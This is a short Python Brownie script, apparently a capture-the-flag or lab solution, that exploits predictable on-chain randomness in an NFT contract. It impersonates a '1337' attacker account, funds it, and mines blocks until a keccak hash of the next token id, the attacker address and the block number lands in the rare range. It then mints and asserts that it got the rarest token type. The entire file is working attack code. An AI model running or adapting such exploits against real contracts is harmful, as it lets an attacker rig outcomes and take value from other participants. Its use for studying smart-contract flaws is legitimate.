#!/usr/bin/python3
from brownie import interface, web3, accounts, chain
from scripts.helpful_scripts import get_account
from colorama import Fore
from eth_abi import encode
from eth_abi.packed import encode_packed


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack():
    nft = interface.INFT("0xFD3CbdbD9D1bBe0452eFB1d1BFFa94C8468A66fC")

    # print(dir(nft))
    attacker = accounts.at(
        "0x0000000000000000000000000000000000001337", force=True
    )  # get_account()

    # send 1 ETH to attacker
    admin = get_account()
    admin.transfer(attacker, "1 ether").wait(1)

    # print(web3.eth.blockNumber)
    # print(attacker.address)
    # exit()
    nft_id = nft.id()
    # print(nft_id)

    for _ in range(100):
        encoded_data = encode(
            ["uint256", "address", "uint256"],
            [
                nft_id + 1,
                attacker.address,
                web3.eth.blockNumber,
            ],
        )
        u256 = web3.toInt(web3.keccak(encoded_data))

        # print(u256)
        if (u256 % 100) > 90:
            nft.mint({"from": attacker, "value": "1 ether"})
            print(u256)
            print(u256 % 100)
            break
        else:
            # make some fake tx to increase the blockNumber
            # jadu.transfer(attacker, "0.001 ether").wait(1)
            # mine next block
            chain.mine(1)
    # print(attacker.balance())

    nft_id = nft.id()
    print(f"{green}NFT Id: {blue}{nft_id}")
    print(f"{green}NFT type: {blue}{nft.tokens(nft_id)}")

    assert nft.tokens(nft_id) == 3


def main():
    attack()


if __name__ == "__main__":
    main()
